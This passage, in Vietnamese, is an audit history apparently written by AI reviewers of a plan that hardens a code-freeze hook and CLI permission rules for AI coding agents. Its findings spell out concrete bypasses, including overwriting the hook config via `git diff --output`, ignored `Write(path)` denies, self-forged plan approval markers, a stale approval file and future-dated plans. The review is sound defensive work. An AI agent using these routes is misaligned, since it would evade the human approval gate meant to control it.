| **Domain: Vikini Governance 2.0 & Model Roster** |   `PASS`   | `[SRC]` / `[URL]` | Đối chiếu `[URL]` `https://antigravity.google/docs/models.md` và `https://antigravity.google/changelog.md` (`v2.19.1`, `v2.24.0`): việc thay thế `claude-4.6-opus` và `Gemini 3.1 Pro` bằng 4 model (`gemini-4-argon`, `claude-opus-5-5`, `claude-sonnet-5-5`, `gemini-3.8-flash`) và bỏ tự đọc `02-quality.md` trong `@planner` Bước 0 phản ánh đúng hành vi platform hiện hành. |

---

#### 4. Các Tấn Công Đã Thử (Attack Vectors Probed)

1. **Tấn công 1 — Quét toàn bộ thư mục `.agents/` để tìm tham chiếu sót tới các model cũ (`claude-4.6-opus`, `Opus 4.6`, `Sonnet 4.6`, `Gemini 3.1 Pro`) ngoài 3 file kế hoạch đã nêu**:
   - **Cách thử**: Đọc trực tiếp toàn bộ các file cấu hình và tài liệu trong `.agents/` bằng `view_file`: `[SRC]` `.agents/agents/planner/agent.md:1-102`, `.agents/agents/reviewer/agent.md:1-123`, `.agents/agents/qa/agent.md:1-167`, `.agents/rules/00-core.md:1-68`, `.agents/rules/01-coding.md:1-143`, `.agents/rules/02-quality.md:1-160`, `.agents/rules/03-ui.md:1-98`, `.agents/rules/04-bilingual.md:1-57`, `.agents/rules/05-plan-review.md:1-108`, `.agents/README.md:1-106`, `.agents/skills/README.md:1-55`, `.agents/scripts/claude-planner-prompt.md:1-84`, `.agents/scripts/claude-reviewer-prompt.md:1-52`, `.agents/scripts/run-claude.ps1:1-196`.
   - **Kết quả**: Chỉ có đúng 2 file chứa chuỗi model cũ là `[SRC]` `.agents/agents/qa/agent.md:4,133` (`claude-4.6-opus`) và `[SRC]` `.agents/rules/01-coding.md:93` (`Claude Opus 4.6 / 5.5, Gemini 4 Argon, Gemini 3.1 Pro`), cùng bảng định tuyến tại `[SRC]` `.agents/README.md:91-105` thiếu dòng `@qa`. Cả 3 vị trí này đều đã được đưa vào Bước 2, Bước 3 và Bước 5 của Revision 3 (dòng 383–385, 403, 454) và kiểm tra hậu nghiệm tại `TC-08` (dòng 479) & `Wiring Probe 2` (dòng 509).
2. **Tấn công 2 — Kiểm tra nguy cơ mất quy tắc chất lượng khi xóa yêu cầu đọc `.agents/rules/02-quality.md` khỏi Bước 0 của `.agents/agents/planner/agent.md:30`**:
   - **Cách thử**: Đối chiếu `[URL]` `https://antigravity.google/changelog.md` (`v2.19.1`, ngày 30/09/2026: _"Fixed an issue where custom agents ignored your global and project rules"_) với cấu hình frontmatter tại `[SRC]` `.agents/rules/02-quality.md:1-4` (`trigger: always_on`) và `.agents/scripts/claude-planner-prompt.md:18`.
   - **Kết quả**: Do `.agents/rules/02-quality.md` giữ `trigger: always_on`, nền tảng Antigravity từ `v2.19.1` trở đi tự động nạp nội dung rule này vào context của custom subagent `@planner` ngay khi khởi tạo. Trong khi đó, kênh Claude Code CLI chạy bên ngoài IDE vẫn giữ dòng hướng dẫn đọc `.agents/rules/02-quality.md` tại `[SRC]` `.agents/scripts/claude-planner-prompt.md:18`. Do đó không xảy ra thiếu hụt quy tắc ở cả hai kênh Planner.
3. **Tấn công 3 — Đối chiếu bảng hỗ trợ gói cước (Tier Availability) và lịch ngừng hoạt động của model trên tài liệu chính thức `models.md`**:
   - **Cách thử**: Kiểm tra trực tiếp bảng Models tại `[URL]` `https://antigravity.google/docs/models.md` cho các gói Google AI Pro và Google AI Ultra.
   - **Kết quả**: Bảng chính thức xác nhận `Claude Sonnet 4.6 (thinking)` và `Claude Opus 4.6 (thinking)` có dấu `❌` ở Google AI Ultra & Enterprise kèm ghi chú _"Will be removed on November 2, 2026"_, và `Gemini 3.1 Pro` có dấu `❌` ở tất cả các gói cá nhân (Free/Plus/Pro/Ultra). Bốn mô hình khả dụng đầy đủ (`✅`) trên Pro và Ultra là `Gemini 4 Argon`, `Gemini 3.8 Flash`, `Claude Sonnet 5.5 (thinking)`, và `Claude Opus 5.5 (thinking)`, khớp với Mục 3.1.2 (dòng 109–113) và Mục 4 (dòng 142) của Revision 3.
4. **Tấn công 4 — Thử nghiệm độ khớp số lượng heading `## ` (`--expected-headings=113`) với cổng `[5/5]` của `scripts/verify-docs.mjs`**:
   - **Cách thử**: Kiểm tra mã nguồn `[SRC]` `scripts/verify-docs.mjs:256-277` (`const currentHeadings = (currentContent.match(/^## /gm) || []).length; const legacyHeadings = (legacyContent.match(/^## /gm) || []).length; const totalHeadings = currentHeadings + legacyHeadings; if (totalHeadings !== expectedHeadings)`).
   - **Kết quả**: Việc cắt 32 mục từ `[SRC]` `docs/CHANGELOG.md:122-847` sang `docs/archive/CHANGELOG-legacy.md` bảo toàn tổng số `38 + 74 = 112` heading sẵn có; cộng thêm 1 heading mới của task này tại Bước 5 (dòng 459) tạo ra đúng `7 + 106 = 113` heading, khớp với tham số `--expected-headings=113` tại Bước 5 (dòng 460), `TC-07` (dòng 478), `TC-09` (dòng 480) và Mục 9.2 (dòng 496).

---

#### 5. Claim Verification & Adversarial Timelines

- **Kiểm chứng tài liệu trực tuyến (`[URL]`)**:
  - `https://antigravity.google/docs/models.md`: Xác nhận 4 model chủ lực tháng 10/2026 (`Gemini 4 Argon`, `Gemini 3.8 Flash`, `Claude Opus 5.5 (thinking)`, `Claude Sonnet 5.5 (thinking)`) và lịch gỡ bỏ `Claude 4.6` vào ngày 02/11/2026.
  - `https://antigravity.google/changelog.md` (`v2.17.0`–`v2.24.0`): Xác nhận `v2.19.1` sửa lỗi custom agents bỏ qua project rules và `v2.24.0` bổ sung `Claude Opus 5.5` / `Sonnet 5.5`.
- **Adversarial Timelines (4 Trục Đối Kháng — `evidence-bar.md` §4.5.2)**:
  1. **Trục 1 (Concurrent Hook Invocations)**: Mỗi lệnh gọi `code-freeze-guard.js` chỉ đọc đồng bộ (`fs.readFileSync`) file kế hoạch mới nhất trong `docs/plans/`, không phát sinh tranh chấp ghi trạng thái.
  2. **Trục 2 (TOCTOU & Temporal Ordering `mtimeMs`)**: Đã khóa rủi ro bằng quy định tại Bước 5 (dòng 461–464): chỉ cập nhật `Status: Completed` ở thao tác cuối cùng và cập nhật `2026-10-19-remake-agents-governance-v2-implementation-plan.md` sau cùng.
  3. **Trục 3 (Fail-Closed Guard & Self-Forgery)**: Gate 3 kiểm tra `isSelfForgedPlanWrite(input.newContent)` khi `input.toolName === "write_to_file"` trên `docs/plans/**`, trả về `ask` nếu có `- **Status**: Approved` ở 30 dòng đầu hoặc `[PLAN_APPROVED]` ở dòng không rỗng cuối cùng.
  4. **Trục 4 (Serverless / Stateless Process)**: Không chạm vào `src/app/api/**`; tiến trình CLI hook local hoạt động stateless với `"timeout": 5`.

---

#### 6. Commands Executed & Dismissed Findings

##### 6.1. Commands Executed (Trong ALLOWLIST)

1. `npm run type-check` ➔ **Exit code 0** (`tsc --noEmit` không có lỗi).
2. `npx vitest run .agents/scripts/code-freeze-guard.test.ts` ➔ **Exit code 0** (`1 passed`, `92/92 tests passed`).
3. `git status` ➔ **Exit code 0** (xác nhận trạng thái working tree hiện tại).
4. `npm run lint` ➔ **Exit code 0** (`eslint .` không có lỗi).

##### 6.2. Dismissed Findings (Các Nghi Vấn Đã Kiểm Chứng Và Loại Bỏ)

- **Nghi vấn: Liệu `.agents/scripts/claude-planner-prompt.md` hoặc `.agents/scripts/claude-reviewer-prompt.md` có chứa tham chiếu tới `claude-4.6-opus` hay `Gemini 3.1 Pro` không?**:
  - Đã kiểm chứng `[SRC]` `.agents/scripts/claude-planner-prompt.md:1-84` và `.agents/scripts/claude-reviewer-prompt.md:1-52`: cả hai file chỉ dùng nhãn định danh vai trò `[PLANNER_MODEL: claude-code-cli]`, `[REVIEWER_MODEL: claude-code-cli (fallback)]` và `gemini-4-argon`, không chứa tên model cũ.

---

#### 7. Kết Luận Phê Duyệt

Bản kế hoạch **Revision 3** đã cập nhật đầy đủ ghi chú `MIN-02` (`--expected-headings=113`) từ Audit Run 2, bảo toàn các bản sửa lỗi từ Audit Run 1 (`BLK-01`, `MAJ-01`, `MAJ-02`, `MAJ-03`, `MIN-01`), và đồng bộ danh mục model tháng 10/2026 cùng cơ chế kế thừa rule của subagents theo tài liệu Google Antigravity `v2.19.1`–`v2.24.0`. Kế hoạch đạt chuẩn phê duyệt để triển khai.

---

### Audit Run 4

[REVIEWER_MODEL: claude-code-cli (fallback)]

- **Reviewer**: Claude Code CLI (Fallback Reviewer)
- **Ngày**: 2026-10-20
- **Đối tượng**: Revision 4 (`docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`)
- **Kết quả**: `[CHANGES_REQUESTED]` (1 `[BLOCKER]`, 4 `[MAJOR]`, 2 `[MINOR]`)

> Ghi chú quy trình: Audit Run 3 kết luận "đạt chuẩn phê duyệt" nhưng dòng cuối file không có thẻ `[PLAN_APPROVED]`, và Header của Revision 4 đang ở `Ready for Review` → không có phê duyệt nào còn hiệu lực. Các mã `B1`, `B2`, `M1`–`M5`, `Minor 1`–`9` mà Revision 4 trích dẫn không có trong `## Audit History`; lượt này kiểm chứng trực tiếp các cơ chế mà các mã đó mô tả trên code thật.

#### 1. Kiểm Chứng Lỗi Cũ

| Mã Lỗi   |   Mức Độ    | Trạng Thái | Bằng Chứng                                                                                                                                                                                                                                              |
| :------- | :---------: | :--------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `BLK-01` | `[BLOCKER]` | **ĐÃ SỬA** | Mục 6.2 dùng `UNFROZEN_PREFIXES`/`UNFROZEN_FILES`, `decide(input, options)` với `targetFile`, cú pháp `export function` — khớp `[SRC]` `.agents/scripts/code-freeze-guard.js:39-42,437,465-467`.                                                        |
| `MAJ-01` |  `[MAJOR]`  | **ĐÃ SỬA** | Mục 3.1.4 tách đúng `[4/5]`/`[5/5]`; `[CMD]` `node scripts/verify-docs.mjs --strict-shorthand` → `[5/5] FAIL: CHANGELOG.md exceeds 35,000 bytes (130991 bytes)`, `Total: 112`.                                                                          |
| `MAJ-02` |  `[MAJOR]`  | **ĐÃ SỬA** | Bước 3 liệt kê đủ 5 vị trí; `[CMD]` `grep -n workflows .agents/rules/02-quality.md` → dòng 19, 30, 35, 41, 99, 140 (dòng 35 chỉ là chữ "workflows" thường, không phải đường dẫn). `[SRC]` `.agents/skills/add-model/SKILL.md:12,28,37` khớp với Bước 5. |
| `MAJ-03` |  `[MAJOR]`  | **ĐÃ SỬA** | Mục 5 `#5` tách Wiring/Baseline và Negative Probe; `#26`–`#27` cùng Bước 5 có thứ tự đóng `Completed` (nhưng chưa đủ — xem `MAJ-06`).                                                                                                                   |
| `MIN-01` |  `[MINOR]`  | **ĐÃ SỬA** | `[SRC]` `package.json:101,115,117,120` → `eslint ^9.39.2`, `typescript ^5.9.3`, `vitest ^4.1.12`, `node 24.x`.                                                                                                                                          |
| `MIN-02` |  `[MINOR]`  | **ĐÃ SỬA** | `[CMD]` `grep -c '^## '` → `docs/CHANGELOG.md:38`, `docs/archive/CHANGELOG-legacy.md:74`; giữ 6 mục (dòng 11–99) + 1 mục mới = 7, legacy 74 + 32 = 106 → 113. `[CMD]` `head -121 docs/CHANGELOG.md \| wc -c` = 24,811 bytes (< 35,000).                 |

#### 2. Phát Hiện Mới

##### `[BLOCKER]` `BLK-02`: Allowlist `Bash(git diff*)`, `Bash(git log*)`, `Bash(git show*)` ở kênh CLI cho phép ghi file tùy ý qua `--output=<file>`, vượt qua Code Freeze

- **Vị trí**: Mục 1.1 (dòng 40–41), Mục 6.3 (dòng 410, 414), Bước 4.
- **Bằng chứng**:
  - `[SRC]` `C:/Program Files/Git/mingw64/share/doc/git-doc/diff-options.adoc:136-137`: `--output=<file>` — "Output to a specific file instead of stdout." Tùy chọn này dùng được với `git diff`, `git log`, `git show` (git `2.52.0.windows.1`).
  - `[URL]` `https://code.claude.com/docs/en/permissions` (mục Bash): "Bash rules match the whole command text, with `*` standing in for any text"; kiểm tra Redirections chỉ áp dụng cho `>`, `>>`, `2>` và `tee` — không áp dụng cho cờ ghi file của chính chương trình. Vì vậy `Bash(git diff*)` khớp `git diff --output=.agents/hooks.json HEAD~1`.
  - `[SRC]` `.agents/scripts/code-freeze-guard.js:71` có `--output\b` trong `MUTATING_FLAGS` (đã chặn ở hook Antigravity) — nhưng hook Antigravity **không chạy** bên trong tiến trình Claude CLI do `run-claude.ps1` gọi, nên với kênh CLI thì `--allowedTools`/`--disallowedTools` là lớp chặn duy nhất.
- **Timeline [ADV]**: T1 Planner/Reviewer CLI chạy với `--permission-mode dontAsk` | T2 gọi `git diff --output=.agents/hooks.json HEAD~1` (khớp `Bash(git diff*)` → được phép, không khớp deny nào) | T3 `.agents/hooks.json` bị ghi đè bằng nội dung diff (JSON không hợp lệ) → hook PreToolUse mất hiệu lực ở mọi phiên sau, hoặc file trong `src/**` bị ghi đè. **Kết cục**: Vượt qua Code Freeze → LỖI (`[BLOCKER]`, lỗi bảo mật).
- **Yêu cầu**: Thêm deny rule cụ thể (ví dụ `Bash(git * --output*)`) vào `$disallowedTools`, hoặc thu hẹp allow rule để không nhận cờ tùy ý; thêm Negative/Wiring Probe trong Mục 9.3 và đưa vào Risk #1.

##### `[MAJOR]` `MAJ-04`: Luật `Write(path)` của Claude Code bị bỏ qua; `Edit(docs/plans/*)` cũng cấp quyền cho tool `Write` → Reviewer không hề bị "thu hồi Write", còn deny `Write(src/*)` không có tác dụng

- **Vị trí**: Mục 1.1 (dòng 40–41), Mục 3.1.3, Mục 5 `#13`, Mục 6.3 (dòng 407–414), Mục 10 Risk #1, `TC-08`.
- **Bằng chứng** `[URL]` `https://code.claude.com/docs/en/permissions` (mục Read and Edit):
  - "Claude Code checks file permissions against `Edit(path)` and `Read(path)` rules only. If you write a path rule for `Write` … Claude Code accepts the rule but never consults it, and warns at startup … Use `Edit(docs/**)` in place of `Write(docs/**)`."
  - "`Edit` rules apply to all built-in tools that edit files."
  - "Claude Code doesn't warn about a tool-name rule with no path, such as a deny rule for `Write`; it matches that rule at the tool level everywhere."
  - "In gitignore patterns, `*` matches within a single path segment … while `**` matches across directories" → `Edit(src/*)`, `Edit(.agents/*)` chỉ khớp file nằm ngay cấp đầu, không khớp `src/lib/core/x.ts` hay `.agents/scripts/code-freeze-guard.js`.
- **Hệ quả**: (1) Fallback Reviewer CLI vẫn dùng được `Write` để ghi đè toàn bộ `docs/plans/*.md` (kể cả ghi một bước `Status: Approved` + `[PLAN_APPROVED]`), trái với thiết kế "chỉ `Edit`" ở Mục 6.3 / 05-plan-review §3.2 — Single-Step Pre-Approved Plan Guard ở hook không bảo vệ kênh này. (2) Các deny rule `Write(...)`, `Edit(src/*)`, `Edit(.agents/*)` chỉ là trang trí; an toàn thực tế chỉ đến từ cơ chế từ chối mặc định của `dontAsk`. Risk #1 (Cao) đang trỏ tới control không có hiệu lực → vi phạm `evidence-bar.md` §4.5.1/§4.5.4.
- **Yêu cầu**: Bỏ toàn bộ rule `Write(<path>)`; Planner dùng `Edit(docs/plans/*)`; Reviewer thêm deny ở mức tool `Write` (không kèm path) vào `--disallowedTools`; đổi deny path sang `Edit(src/**)`, `Edit(.agents/**)`; cập nhật Mục 3.1.3, 6.3, Risk #1, Wiring Probe 1 (không còn chuỗi `Write(` kèm path).

##### `[MAJOR]` `MAJ-05`: Dưới `--permission-mode dontAsk`, allowlist Bash của Planner/Reviewer CLI thiếu các lệnh kiểm chứng mà `evidence-bar.md`/`allowlist.md` bắt buộc → Fallback Reviewer không chạy được Negative Probe, S1–S5 buộc phải `UNVERIFIED`

- **Vị trí**: Mục 6.3 (dòng 410, 414) so với Mục 5 `#4`, `#5` và Bước 2.
- **Bằng chứng**: `[URL]` `https://code.claude.com/docs/en/permissions`: `dontAsk` "Auto-denies every call that would otherwise prompt". Allowlist dự kiến chỉ có `npm run type-check`, `npm run lint`, `npx tsc --noEmit` và git read-only. Trong khi đó Revision 4 tự quy định Negative Probe hợp lệ là `npx vitest run <path>` (Mục 5 `#5`), thêm `node scripts/verify-docs.mjs` vào `allowlist.md` (Mục 5 `#4`), và `[SRC]` `.agents/agents/reviewer/allowlist.md` (Nhóm A/B) còn có `npm run test:run`, `npm run verify`, `npx tsc --showConfig`, `npx eslint --print-config`, `npm ls`, `npm view`. Lượt Audit này phải dùng `npx vitest run` và `node scripts/verify-docs.mjs` để kiểm chứng — cả hai sẽ bị tự động từ chối trong cấu hình mới.
- **Hệ quả**: Fallback Reviewer chỉ có thể ra `[CHANGES_REQUESTED]` do `UNVERIFIED` (05-plan-review §4), hoặc phê duyệt khi không có bằng chứng → phá vỡ Uninterrupted Execution Chain. Lệnh bị từ chối cũng không phải lỗi quota nên không kích hoạt `exit 42`.
- **Yêu cầu**: Đồng bộ `--allowedTools` của cả 2 Role với Nhóm A–D trong `allowlist.md` (ví dụ `Bash(npx vitest run *)`, `Bash(npm run test:run)`, `Bash(npm run verify)`, `Bash(node scripts/verify-docs.mjs*)`, `Bash(npx tsc --showConfig)`, `Bash(npx eslint --print-config *)`, `Bash(npm ls*)`, `Bash(npm view *)`), kèm deny cho các cờ ghi file (`--update`, `-u`, `--coverage`, `--outputFile`, `--fix`) như `code-freeze-guard.js:59-62,71`; thêm Wiring Probe đối chiếu hai danh sách.

##### `[MAJOR]` `MAJ-06`: Còn 2 plan khác cùng ngày `2026-10-19` đang `Approved` + `[PLAN_APPROVED]` → sau Bước 5, `evaluateLatestDateGroupPlans()` vẫn trả `true`, repo **không** bị khóa lại

- **Vị trí**: Mục 1.1 (dòng 50), Mục 1.2 (dòng 76), Mục 3.2 (dòng 152), Mục 5 `#26`–`#27`, Bước 5 (dòng 555–558), `TC-02`.
- **Bằng chứng**:
  - `[CMD]` `ls docs/plans` + đọc header/dòng cuối: `2026-10-19-pstack-skills-and-fast-track-implementation-plan.md` → `Status: Approved`, cuối file `[PLAN_APPROVED]`; `2026-10-19-swap-planner-reviewer-workflow-implementation-plan.md` → `Status: Approved`, cuối file `[PLAN_APPROVED]` (cả hai đã commit tại `82152ba`).
  - `[CMD]` `node -e` mô phỏng nguyên văn hàm ở Mục 6.1 với trạng thái sau Bước 5 (pstack/swap `Approved`, vitest/governance `Completed`) → `true`.
- **Hệ quả**: Trái với tuyên bố "khóa lại repo hoàn toàn cho nhiệm vụ tiếp theo" (Mục 3.2, Bước 5.3); lỗ hổng Stale/Completed Plan Unlock mà kế hoạch muốn vá vẫn còn cho tới khi xuất hiện plan có ngày mới hơn.
- **Yêu cầu**: Thêm 2 file này vào `[MODIFY]`, Bước 5 và `docs/plans/README.md` (chuyển sang `Completed`), sửa ngoại lệ ở Mục 1.2; bổ sung case vào `TC-02` cho nhóm ngày mới nhất gồm nhiều plan `Approved` đã triển khai xong, và thêm Wiring Probe khẳng định `isPlanApproved()` trả `false` sau Bước 5.

##### `[MAJOR]` `MAJ-07`: Marker `.agents/.plan-approved` vẫn bỏ qua toàn bộ logic mới, và kế hoạch còn đưa nó vào `.gitignore` khiến marker cũ bị ẩn khỏi `git status`

- **Vị trí**: Mục 1.1 (dòng 60), Mục 5 `#14`, `#21`, Bước 4.3, Bước 5 (dòng 539).
- **Bằng chứng**: `[SRC]` `.agents/scripts/code-freeze-guard.js:176-191`: `isPlanApproved()` kiểm tra `.agents/.plan-approved` **trước tiên**; nội dung `true` / `APPROVED` / `{"approved":true}` → `return true`, bỏ qua mọi kiểm tra plan. Bước 4.3 chỉ mô tả thay phần đọc `docs/plans/`, không nói xóa hay giới hạn nhánh marker. `[CMD]` `git check-ignore -v .agents/.plan-approved` → hiện chưa bị ignore; kế hoạch sẽ ignore nó.
- **Timeline [ADV]**: T1 User duyệt một lần việc tạo marker cho task A | T2 Task A xong, plan chuyển `Completed` | T3 Task B tạo plan `Ready for Review` → `isPlanApproved()` vẫn trả `true` vì marker còn đó, fail-safe theo ngày không bao giờ chạy; `.gitignore` làm marker không hiện trong `git status`. **Kết cục**: Stale unlock vô thời hạn → LỖI (`[MAJOR]`).
- **Yêu cầu**: Hoặc xóa nhánh marker khỏi `isPlanApproved()` (giữ `docs/plans/` làm nguồn chân lý duy nhất), hoặc nêu rõ lý do giữ và áp cùng vòng đời; không đưa marker vào `.gitignore`; nếu còn giữ marker, thêm test âm tính (có marker + plan mới `Ready for Review` → `false`).

##### `[MINOR]` `MIN-03`: Số đếm route trong phần sửa doc drift không khớp code

- `[CMD]` `grep -rl 'requireUser(' src/app/api --include=route.ts` → **8** route files (conversations ×2, files ×2, messages ×3, user-templates ×1), không phải 11; `grep -rlE 'await auth\(\)' src/app/api --include=route.ts` → 28 (kế hoạch ghi 29). Khuyến nghị không ghi cứng số lượng vào `.agents/skills/README.md`/`02-quality.md`, chỉ liệt kê nhóm route.

##### `[MINOR]` `MIN-04`: Rủi ro tồn dư của sắp xếp theo tiền tố ngày và giả mạo hai bước chưa có trong bảng rủi ro

- `[CMD]` `node -e` mô phỏng Mục 6.1: file `2099-01-01-x.md` (Approved) luôn chiếm nhóm ngày mới nhất → `true`, che mọi plan thật. Chuỗi hai bước `write_to_file` (`Ready for Review`) → `replace_file_content` (đổi thành `Approved` + `[PLAN_APPROVED]`) không bị hook hỏi (đúng với định danh "Single-Step"). Khuyến nghị: bỏ qua hoặc `ask` với tiền tố ngày lớn hơn ngày hiện tại + 1, và ghi rủi ro tồn dư giả mạo 2 bước vào Mục 10 kèm control thực tế (`@qa` hậu kiểm, review `git diff`).

#### 3. Plan Completeness Gate (7 Hạng Mục)

|  #  | Hạng mục                                |      Kết quả       | Ghi chú                                                                                                                                                    |
| :-: | :-------------------------------------- | :----------------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------- |
|  1  | Bảng Verified Versions 2026             |        PASS        | Mục 4; khớp `package.json:101,115,117,120`.                                                                                                                |
|  2  | Checklist `[NEW]`/`[MODIFY]`/`[DELETE]` |      **FAIL**      | Thiếu 2 plan cùng ngày (`MAJ-06`).                                                                                                                         |
|  3  | Verification Plan & Probes              |      **FAIL**      | Không có probe cho `--output` (`BLK-02`), cho ngữ nghĩa permission thực của Claude Code (`MAJ-04`), hay cho trạng thái khóa sau Bước 5 (`MAJ-06`).         |
|  4  | Test Contract                           | PASS (cần bổ sung) | Có TC-01..TC-09; cần thêm case theo `MAJ-06`, `MAJ-07`.                                                                                                    |
|  5  | Assumptions & Cross-Task Dependencies   |      **FAIL**      | Mục 3.2 bỏ sót `pstack-skills` và `swap-planner-reviewer` (`MAJ-06`); giả định 3.1.3 về `Write(...)` sai (`MAJ-04`).                                       |
|  6  | Out of Scope                            |        PASS        | Mục 1.2 (cần sửa ngoại lệ theo `MAJ-06`).                                                                                                                  |
|  7  | Skills Loaded & Applied                 |        PASS        | Mục 2.2 trích dẫn `vikini-investigate`, `vikini-simplify`, `api-patterns`, `add-model`, `add-translation`; task không chạm domain streaming/DB/UI runtime. |

#### 4. Mental Simulation Matrix (S1–S6 + Domain)

| Kịch bản                           |     Kết quả     | Bằng chứng                                                                                                                                                                                                                                                                                                                                |
| :--------------------------------- | :-------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S1 Cold-start & Build              | PASS (baseline) | `[CMD]` `npm run type-check` → exit 0; `[CMD]` `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → `92 passed (92)`; không thêm dependency (Mục 1.2); 6 hàm mới nằm cùng file nên không import module chưa tồn tại.                                                                                               |
| S2 Lifecycle & Teardown            |      PASS       | Không có SSE/connection; hàm mới là hàm thuần nhận `planEntries` (Mục 6.1), theo mẫu inject `options.planApproved` tại `[SRC]` `code-freeze-guard.js:541-542` → không phụ thuộc fs, không mock vòng tròn.                                                                                                                                 |
| S3 Database & Temporal             |    **FAIL**     | Không chạm DB. Logic thời gian: `[ADV]` sắp xếp theo ngày + nhóm ngày mới nhất cho kết quả sai sau Bước 5 (`MAJ-06`) và với tiền tố ngày tương lai (`MIN-04`).                                                                                                                                                                            |
| S4 Cross-Task State                |    **FAIL**     | `[CMD]` header của 4 plan `2026-10-19-*` → 2 plan Approved bị bỏ sót (`MAJ-06`); marker `.agents/.plan-approved` (`MAJ-07`).                                                                                                                                                                                                              |
| S5 Security Boundary               |    **FAIL**     | `BLK-02` (`git --output`), `MAJ-04` (`Write(path)` bị bỏ qua, `Edit` bao gồm cả `Write`). Riêng `-ArtifactFile`: PASS — Mục 6.3 dùng `GetFullPath` + `StartsWith($brainRoot)` (có dấu phân cách cuối) + `.md` + chặn `..`, chặn được `-ArtifactFile src/app/page.tsx`, trong khi `[SRC]` `run-claude.ps1:182-193` hiện không kiểm tra gì. |
| S6 External Resilience             |      PASS       | `[SRC]` `run-claude.ps1:162-176` giữ phát hiện quota → `exit 42`; kế hoạch không đổi phần này (xem lưu ý ở `MAJ-05`).                                                                                                                                                                                                                     |
| Domain (Governance / Model Roster) |      PASS       | Thay `claude-4.6-opus`/`Gemini 3.1 Pro`; ghi rõ giới hạn của `model: pro`; `[CMD]` `verify-docs` `[4/5]` hiện PASS.                                                                                                                                                                                                                       |

#### 5. Adversarial Timelines (4 trục)

1. **Đồng thời**: T1 Planner tạo plan ngày `2026-10-20` (`Ready for Review`) | T2 cùng lúc agent khác ghi vào `src/` | T3 `evaluateLatestDateGroupPlans` thấy nhóm `2026-10-20` có plan đang chờ → `false`. **AN TOÀN** (fail-safe đúng).
2. **TOCTOU**: xem `MAJ-07` (marker sót lại) và `MIN-04` (giả mạo 2 bước). **LỖI** (`[MAJOR]` / `[MINOR]`).
3. **Thất bại giữa chừng**: T1 `run-claude.ps1` kiểm tra `-ArtifactFile` hợp lệ | T2 Claude CLI exit ≠ 0 | T3 bước Copy-Item bị bỏ qua (`[SRC]` `run-claude.ps1:182` yêu cầu `$claudeExitCode -eq 0`). **AN TOÀN**.
4. **Môi trường / kênh thực thi**: hook Antigravity không bao phủ tiến trình Claude CLI → `--allowedTools`/`--disallowedTools` là ranh giới duy nhất → `BLK-02`, `MAJ-04`. **LỖI** (`[BLOCKER]`).

#### 6. Commands Executed

- `wc -c` / `wc -l` các file governance, plan và scripts.
- `git diff --stat`, `git version`, `git check-ignore -v .agents/.plan-approved`.
- `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → exit 0, `92 passed`.
- `node scripts/verify-docs.mjs --strict-shorthand` → `[1/5]`–`[4/5]` PASS, `[5/5]` FAIL (130,991 bytes, Total 112).
- `npm run type-check` → exit 0.
- `grep -c '^## '` trên 2 file CHANGELOG; `head -121 docs/CHANGELOG.md | wc -c` → 24,811.
- `grep -rl 'requireUser(' src/app/api --include=route.ts` (8); `grep -rlE 'await auth\(\)' src/app/api --include=route.ts` (28).
- Đọc header và dòng không rỗng cuối của 4 file `docs/plans/2026-10-19-*.md`.
- `node -e` (Nhóm C, in-memory, không I/O): mô phỏng `evaluateLatestDateGroupPlans` (sau Bước 5 → `true`; tiền tố `2099` → `true`) và regex `READ_ONLY_COMMANDS` / `MUTATING_FLAGS` với `git diff --output=...` (`true` / `true`).
- Đọc `diff-options.adoc` của Git for Windows; WebFetch `https://code.claude.com/docs/en/permissions`.

#### 7. Dismissed Findings

- **Nghi vấn hook cho phép `git diff --output`**: Loại bỏ cho kênh Antigravity — `[SRC]` `code-freeze-guard.js:71` (`MUTATING_FLAGS` khớp `--output\b`) được kiểm tra trước `READ_ONLY_COMMANDS` (`:586`). Lỗi chỉ tồn tại ở kênh CLI (`BLK-02`).
- **Nghi vấn regex `-Task "..."` làm lọt lệnh nối chuỗi**: Loại bỏ — `[SRC]` `code-freeze-guard.js:560-585` tách `;` và chặn `[;|&` + backtick + `]`, `$(`, `>` trước khi so allowlist → fail-closed.
- **Nghi vấn số heading 113 sai**: Loại bỏ — `[CMD]` 38 + 74 = 112, + 1 = 113.

#### 8. Kết Luận & Việc Cần Làm Cho Planner (Revision 5)

1. `BLK-02`: Chặn `--output` (và các cờ ghi file khác) trong các allow rule `git` ở kênh CLI; thêm probe và cập nhật Risk #1.
2. `MAJ-04`: Viết lại Mục 3.1.3 và 6.3 theo đúng ngữ nghĩa permission của Claude Code (`Edit(...)` thay cho `Write(...)`, deny tool-level `Write` cho Reviewer, dùng `**` cho deny path).
3. `MAJ-05`: Đồng bộ `--allowedTools` với `allowlist.md` để Fallback Reviewer chạy được `npx vitest run`, `node scripts/verify-docs.mjs`, `npm run verify`, v.v.
4. `MAJ-06`: Đưa `2026-10-19-pstack-skills-and-fast-track-implementation-plan.md` và `2026-10-19-swap-planner-reviewer-workflow-implementation-plan.md` vào `[MODIFY]` / Bước 5 / `TC-02`; thêm probe khẳng định repo bị khóa sau Bước 5.
5. `MAJ-07`: Xử lý nhánh marker `.agents/.plan-approved` trong `isPlanApproved()` và bỏ việc ignore marker.
6. `MIN-03`, `MIN-04`: khuyến nghị, không chặn.

[CHANGES_REQUESTED]

### Audit Run 5

[REVIEWER_MODEL: claude-code-cli (fallback)]

- **Reviewer**: Claude Code CLI (Fallback Reviewer)
- **Ngày**: 2026-10-20
- **Đối tượng**: Revision 5 (`docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`)
- **Kết quả**: `[CHANGES_REQUESTED]` (1 `[BLOCKER]`, 2 `[MAJOR]`, 1 `[MINOR]`)

#### 1. Kiểm Chứng Lỗi Cũ (Từ Audit Run 4)

| Mã Lỗi   |   Mức Độ    |                        Trạng Thái                         | Bằng Chứng                                                                                                                                                                                                                                                                                                                                                                           |
| :------- | :---------: | :-------------------------------------------------------: | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
